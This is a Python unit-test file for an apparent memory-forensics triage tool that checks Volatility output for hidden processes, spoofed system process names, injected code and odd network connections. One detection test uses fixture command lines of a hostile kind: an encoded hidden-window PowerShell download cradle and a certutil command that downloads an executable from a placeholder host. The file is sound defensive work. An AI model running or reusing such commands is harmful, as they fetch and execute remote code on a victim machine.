import json
import os
import stat
import sys
import tempfile
import textwrap
import unittest
from pathlib import Path

from fet import memory as m


def proc(pid, ppid, name, offset, exit_time=None, create="2024-05-01T10:00:00+00:00"):
    return {"PID": pid, "PPID": ppid, "ImageFileName": name, "Offset(V)": offset, "Threads": 4,
            "CreateTime": create, "ExitTime": exit_time}


def healthy_pslist():
    return [
        proc(4, 0, "System", 0x1000),
        proc(300, 4, "smss.exe", 0x2000),
        proc(500, 400, "wininit.exe", 0x3000),
        proc(620, 500, "services.exe", 0x4000),
        proc(640, 500, "lsass.exe", 0x5000),
        proc(760, 620, "svchost.exe", 0x6000),
        proc(2100, 2000, "explorer.exe", 0x7000),
    ]


def healthy_cmdline():
    return [
        {"PID": 760, "Process": "svchost.exe", "Args": r"C:\Windows\system32\svchost.exe -k DcomLaunch -p"},
        {"PID": 640, "Process": "lsass.exe", "Args": r"C:\Windows\system32\lsass.exe"},
        {"PID": 2100, "Process": "explorer.exe", "Args": r"C:\Windows\Explorer.EXE"},
    ]


def ids(findings):
    return sorted(f["id"] for f in findings)


class FlattenTests(unittest.TestCase):
    def test_children_are_flattened_in_order(self):
        tree = [{"PID": 4, "__children": [{"PID": 300, "__children": [{"PID": 500, "__children": []}]}, {"PID": 8}]}]
        self.assertEqual([r["PID"] for r in m.flatten(tree)], [4, 300, 500, 8])
        self.assertNotIn("__children", m.flatten(tree)[0])

    def test_get_is_case_insensitive_and_alias_aware(self):
        self.assertEqual(m.get({"pid": 7}, "pid"), 7)
        self.assertEqual(m.get({"Name": "x.exe"}, "name"), "x.exe")
        self.assertEqual(m.get({"CommandLine": "a b"}, "args"), "a b")
        self.assertIsNone(m.get({}, "pid"))


class HiddenProcessTests(unittest.TestCase):
    def test_unlinked_live_process_is_high(self):
        pslist = healthy_pslist()
        psscan = pslist + [proc(1337, 620, "implant.exe", 0x9000)]
        f = m.find_hidden_processes(pslist, psscan)
        self.assertEqual(ids(f), ["MEM-001"])
        self.assertEqual((f[0]["pid"], f[0]["severity"]), (1337, "high"))

    def test_exited_process_is_info_only(self):
        pslist = healthy_pslist()
        psscan = pslist + [proc(999, 620, "old.exe", 0x9100, exit_time="2024-05-01T11:00:00+00:00")]
        f = m.find_hidden_processes(pslist, psscan)
        self.assertEqual([(x["id"], x["severity"]) for x in f], [("MEM-002", "info")])

    def test_clean_when_lists_agree(self):
        self.assertEqual(m.find_hidden_processes(healthy_pslist(), healthy_pslist()), [])


class ProcessTreeTests(unittest.TestCase):
    def test_healthy_system_has_no_findings(self):
        self.assertEqual(m.check_process_tree(healthy_pslist(), healthy_cmdline()), [])

    def test_wrong_parent(self):
        ps = healthy_pslist() + [proc(3000, 2100, "svchost.exe", 0xA000)]  # child of explorer
        f = m.check_process_tree(ps, [])
        self.assertIn("MEM-010", ids(f))

    def test_missing_parent_is_not_an_error(self):
        # wininit's parent (smss clone) has exited; services.exe etc. are fine
        self.assertEqual([x for x in m.check_process_tree(healthy_pslist(), []) if x["id"] == "MEM-010"], [])

    def test_duplicate_lsass(self):
        ps = healthy_pslist() + [proc(4000, 500, "lsass.exe", 0xB000)]
        self.assertIn("MEM-011", ids(m.check_process_tree(ps, [])))

    def test_exited_duplicate_is_ignored(self):
        ps = healthy_pslist() + [proc(4000, 500, "lsass.exe", 0xB000, exit_time="2024-05-01T11:00:00+00:00")]
        self.assertNotIn("MEM-011", ids(m.check_process_tree(ps, [])))

    def test_masquerading_name(self):
        ps = healthy_pslist() + [proc(4100, 620, "scvhost.exe", 0xC000), proc(4101, 620, "lsasss.exe", 0xC100)]
        f = [x for x in m.check_process_tree(ps, []) if x["id"] == "MEM-012"]
        self.assertEqual(sorted(x["process"] for x in f), ["lsasss.exe", "scvhost.exe"])

    def test_legit_similar_names_are_not_flagged(self):
        ps = healthy_pslist() + [proc(4200, 500, "lsm.exe", 0xD000), proc(4201, 620, "taskhostw.exe", 0xD100),
                                 proc(4202, 620, "chrome.exe", 0xD200)]
        self.assertNotIn("MEM-012", ids(m.check_process_tree(ps, [])))

    def test_svchost_without_k(self):
        cmd = healthy_cmdline() + [{"PID": 3333, "Args": r"C:\Windows\system32\svchost.exe"}]
        ps = healthy_pslist() + [proc(3333, 620, "svchost.exe", 0xE000)]
        self.assertIn("MEM-013", ids(m.check_process_tree(ps, cmd)))

    def test_system_binary_from_wrong_path(self):
        ps = healthy_pslist() + [proc(3400, 620, "svchost.exe", 0xE100)]
        cmd = healthy_cmdline() + [{"PID": 3400, "Args": r'"C:\Users\bob\AppData\Local\Temp\svchost.exe" -k x'}]
        f = [x for x in m.check_process_tree(ps, cmd) if x["id"] == "MEM-014"]
        self.assertEqual(len(f), 1)
        self.assertIn("appdata", f[0]["detail"].lower())

    def test_syswow64_path_is_not_flagged(self):
        ps = healthy_pslist() + [proc(3450, 620, "svchost.exe", 0xE200)]
        cmd = healthy_cmdline() + [{"PID": 3450, "Args": r"C:\Windows\SysWOW64\svchost.exe -k x"}]
        self.assertNotIn("MEM-014", ids(m.check_process_tree(ps, cmd)))

    def test_suspicious_command_lines(self):
        ps = healthy_pslist() + [proc(3500, 2100, "powershell.exe", 0xF000), proc(3501, 2100, "cmd.exe", 0xF100)]
        cmd = healthy_cmdline() + [
            {"PID": 3500, "Args": "powershell.exe -NoP -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"},
            {"PID": 3501, "Args": "cmd.exe /c certutil -urlcache -f http://x.test/a.exe a.exe"},
        ]
        f = [x for x in m.check_process_tree(ps, cmd) if x["id"] == "MEM-015"]
        titles = " | ".join(x["title"] for x in f)
        self.assertIn("Encoded PowerShell", titles)
        self.assertIn("Hidden window", titles)
        self.assertIn("certutil", titles)
        self.assertTrue(all(x["mitre"] for x in f))

    def test_benign_powershell_is_not_flagged(self):
        ps = healthy_pslist() + [proc(3600, 2100, "powershell.exe", 0xF200)]
        cmd = healthy_cmdline() + [{"PID": 3600, "Args": "powershell.exe Get-ChildItem C:\\temp"}]
        self.assertNotIn("MEM-015", ids(m.check_process_tree(ps, cmd)))


class MalfindAndNetworkTests(unittest.TestCase):
    def test_malfind_pe_header_is_high(self):
        rows = [
            {"PID": 2100, "Process": "explorer.exe", "Start VPN": 0x1000, "End VPN": 0x1FFF,
             "Protection": "PAGE_EXECUTE_READWRITE", "Hexdump": "4d 5a 90 00 03 00 00 00  MZ......"},
            {"PID": 760, "Process": "svchost.exe", "Start VPN": 0x2000, "End VPN": 0x2FFF,
             "Protection": "PAGE_EXECUTE_READWRITE", "Hexdump": "fc 48 83 e4 f0 e8 cc 00  .H......"},
        ]
        f = m.analyze_malfind(rows)
        self.assertEqual([(x["pid"], x["severity"]) for x in f], [(2100, "high"), (760, "medium")])
        self.assertIn("PE header", f[0]["title"])

    def test_network_rule(self):
        rows = [
            {"PID": 640, "Owner": "lsass.exe", "Proto": "TCPv4", "LocalAddr": "10.0.0.5", "LocalPort": 49152,
             "ForeignAddr": "93.184.216.34", "ForeignPort": 443, "State": "ESTABLISHED"},
            {"PID": 640, "Owner": "lsass.exe", "Proto": "TCPv4", "LocalAddr": "10.0.0.5", "LocalPort": 49153,
             "ForeignAddr": "10.0.0.9", "ForeignPort": 445, "State": "ESTABLISHED"},        # internal: fine
            {"PID": 2100, "Owner": "chrome.exe", "Proto": "TCPv4", "LocalAddr": "10.0.0.5", "LocalPort": 49154,
             "ForeignAddr": "142.250.1.1", "ForeignPort": 443, "State": "ESTABLISHED"},     # browsers may
            {"PID": 640, "Owner": "lsass.exe", "Proto": "TCPv4", "LocalAddr": "0.0.0.0", "LocalPort": 49155,
             "ForeignAddr": "*", "ForeignPort": 0, "State": "LISTENING"},
        ]
        f = m.analyze_network(rows)
        self.assertEqual(len(f), 1)
        self.assertEqual(f[0]["id"], "MEM-030")


class TriageAndIoTests(unittest.TestCase):
    def snapshot(self):
        ps = healthy_pslist()
        return m.Snapshot(
            pslist=ps, psscan=ps + [proc(1337, 620, "implant.exe", 0x9000)], cmdline=healthy_cmdline(),
            malfind=[{"PID": 2100, "Process": "explorer.exe", "Protection": "PAGE_EXECUTE_READWRITE",
                      "Hexdump": "4d 5a 90 00"}],
            netscan=[], source="unit test")

    def test_triage_counts_and_order(self):
        r = m.triage(self.snapshot())
        self.assertEqual(r["counts"]["high"], 2)
        self.assertEqual([f["severity"] for f in r["findings"]], ["high", "high"])
        self.assertEqual(r["plugin_rows"]["pslist"], 7)

    def test_triage_notes_missing_inputs(self):
        r = m.triage(m.Snapshot(pslist=healthy_pslist()))
        self.assertTrue(any("hidden-process" in n for n in r["notes"]))
        self.assertEqual(m.triage(m.Snapshot())["findings"], [])

    def test_markdown_report_mentions_limits(self):
        md = m.render_markdown(m.triage(self.snapshot()))
        self.assertIn("MEM-001", md)
        self.assertIn("T1014", md)
        self.assertIn("Confirm every finding manually", md)
        clean = m.render_markdown(m.triage(m.Snapshot(pslist=healthy_pslist(), psscan=healthy_pslist())))
        self.assertIn("not** proof", clean)

    def test_load_dir_roundtrip(self):
        with tempfile.TemporaryDirectory() as d:
            tree = [{"PID": 4, "ImageFileName": "System", "__children": [{"PID": 300, "ImageFileName": "smss.exe"}]}]
            Path(d, "pslist.json").write_text(json.dumps(tree))
            snap = m.load_dir(d)
            self.assertEqual([r["PID"] for r in snap.pslist], [4, 300])
            self.assertEqual(snap.psscan, [])

    def test_load_dir_errors(self):
        with tempfile.TemporaryDirectory() as d:
            with self.assertRaises(m.MemoryError_):
                m.load_dir(d)
            Path(d, "pslist.json").write_text("{not json")
            with self.assertRaises(m.MemoryError_):
                m.load_dir(d)


class RunPluginTests(unittest.TestCase):
    """Uses a fake 'vol' script so the real command-line contract is exercised without Volatility."""

    def make_fake_vol(self, d, body):
        p = Path(d, "fakevol.py")
        p.write_text(textwrap.dedent(body))
        return [sys.executable, str(p)]

    def test_command_line_and_json_parsing(self):
        with tempfile.TemporaryDirectory() as d:
            vol = self.make_fake_vol(d, """
                import json, sys
                a = sys.argv[1:]
                assert a[:1] == ["-q"] and "-f" in a and a[a.index("-r") + 1] == "json", a
                print(json.dumps([{"PID": 4, "ImageFileName": "System", "plugin": a[-1]}]))
            """)
            out = m.run_plugin("mem.raw", "windows.pslist.PsList", vol)
            self.assertEqual(out[0]["plugin"], "windows.pslist.PsList")

    def test_failure_and_bad_output_are_reported(self):
        with tempfile.TemporaryDirectory() as d:
            bad = self.make_fake_vol(d, "import sys; sys.stderr.write('Unable to validate the plugin requirements'); sys.exit(1)")
            with self.assertRaises(m.MemoryError_) as cm:
                m.run_plugin("mem.raw", "windows.pslist.PsList", bad)
            self.assertIn("Unable to validate", str(cm.exception))
            junk = self.make_fake_vol(d, "print('not json')")
            with self.assertRaises(m.MemoryError_):
                m.run_plugin("mem.raw", "windows.pslist.PsList", junk)

    def test_collect_saves_raw_output_for_every_plugin(self):
        with tempfile.TemporaryDirectory() as d:
            vol = self.make_fake_vol(d, """
                import json
                print(json.dumps([{"PID": 4, "ImageFileName": "System", "__children": []}]))
            """)
            out_dir = Path(d, "raw")
            snap = m.collect("mem.raw", str(out_dir), vol)
            self.assertEqual(sorted(p.name for p in out_dir.iterdir()),
                             sorted(f"{k}.json" for k in m.PLUGINS))
            self.assertEqual(len(snap.pslist), 1)

    def test_malfind_falls_back_to_the_old_plugin_name(self):
        with tempfile.TemporaryDirectory() as d:
            vol = self.make_fake_vol(d, """
                import json, sys
                if sys.argv[-1] == "windows.malware.malfind.Malfind":
                    sys.stderr.write("plugin not found"); sys.exit(1)
                print(json.dumps([{"PID": 1, "Process": "x.exe", "plugin": sys.argv[-1]}]))
            """)
            snap = m.collect("mem.raw", str(Path(d, "raw")), vol)
            self.assertEqual(snap.malfind[0]["plugin"], "windows.malfind.Malfind")
            self.assertEqual(m.PLUGINS["malfind"], "windows.malware.malfind.Malfind")

    def test_other_plugins_do_not_silently_fall_back(self):
        with tempfile.TemporaryDirectory() as d:
            vol = self.make_fake_vol(d, "import sys; sys.stderr.write('boom'); sys.exit(1)")
            with self.assertRaises(m.MemoryError_):
                m.collect("mem.raw", str(Path(d, "raw")), vol)

    def test_missing_volatility_message(self):
        old = os.environ.get("PATH", "")
        os.environ["PATH"] = ""
        try:
            orig = m.shutil.which
            m.shutil.which = lambda *_a, **_k: None
            import importlib.util

            real = importlib.util.find_spec
            importlib.util.find_spec = lambda name, *a, **k: None if name == "volatility3" else real(name, *a, **k)
            with self.assertRaises(m.MemoryError_) as cm:
                m.find_volatility()
            self.assertIn("--from-dir", str(cm.exception))
        finally:
            m.shutil.which = orig
            importlib.util.find_spec = real
            os.environ["PATH"] = old


class LevenshteinTests(unittest.TestCase):
    def test_distance(self):
        self.assertEqual(m.levenshtein("svchost.exe", "scvhost.exe"), 2)
        self.assertEqual(m.levenshtein("a", "a"), 0)
        self.assertEqual(m.levenshtein("", "abc"), 3)


if __name__ == "__main__":
    unittest.main()
